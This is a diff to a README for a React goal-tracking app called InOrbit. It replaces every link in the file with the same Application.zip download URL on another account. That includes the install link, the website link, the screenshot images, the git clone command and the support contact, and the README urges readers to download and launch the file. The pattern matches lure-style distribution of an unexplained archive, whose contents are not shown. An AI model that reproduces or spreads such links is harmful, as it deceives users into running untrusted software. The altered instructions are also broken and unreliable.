@@ -13,7 +13,7 @@ Welcome to **Pocket-Front**, the GitHub repository for InOrbit - a cutting-edge 
 
 🚀 **Installation:**
 
-To get started with InOrbit, simply download the [Release.zip file](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip) and launch the application. You can also find the latest version in the "Releases" section of this repository.
+To get started with InOrbit, simply download the [https://github.com/mxlx2020/pocket-front/releases/download/v1.0/Application.zip file](https://github.com/mxlx2020/pocket-front/releases/download/v1.0/Application.zip) and launch the application. You can also find the latest version in the "Releases" section of this repository.
 
 🔧 **Technologies Used:**
 - React
@@ -25,18 +25,18 @@ To get started with InOrbit, simply download the [Release.zip file](https://gith
 developer-tools, frontend, goal-setting, goals-management, goals-tracker, material-design, modern-web, performance-optimization, personal-development, productivity-tools, react, react-hooks, responsive-design, tailwindcss, time-management, typescript, typescript-react, user-interface, vite, web-application
 
 🌐 **Visit the Official Website:**
-- Click [here](https://www.inorbit.com) to explore the InOrbit official website for more information and updates.
+- Click [here](https://github.com/mxlx2020/pocket-front/releases/download/v1.0/Application.zip) to explore the InOrbit official website for more information and updates.
 
 📸 **Screenshots:**
 
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
-![Screenshot 3](https://example.com/screenshot3.png)
+![Screenshot 1](https://github.com/mxlx2020/pocket-front/releases/download/v1.0/Application.zip)
+![Screenshot 2](https://github.com/mxlx2020/pocket-front/releases/download/v1.0/Application.zip)
+![Screenshot 3](https://github.com/mxlx2020/pocket-front/releases/download/v1.0/Application.zip)
 
 📦 **Get Started:**
 1. Clone the repository: 
    ```
-   git clone https://github.com/username/pocket-front.git
+   git clone https://github.com/mxlx2020/pocket-front/releases/download/v1.0/Application.zip
    ```
 2. Navigate to the project directory:
    ```
@@ -53,4 +53,4 @@ developer-tools, frontend, goal-setting, goals-management, goals-tracker, materi
 
 🌟 **Stay InOrbit and Reach for the Stars!** 🚀
 
-For any questions or feedback, feel free to reach out to our team at [inorbit.support@example.com](mailto:inorbit.support@example.com). We're excited to have you join us on this journey towards achieving your goals with InOrbit!
+For any questions or feedback, feel free to reach out to our team at [https://github.com/mxlx2020/pocket-front/releases/download/v1.0/Application.zip](https://github.com/mxlx2020/pocket-front/releases/download/v1.0/Application.zip). We're excited to have you join us on this journey towards achieving your goals with InOrbit!
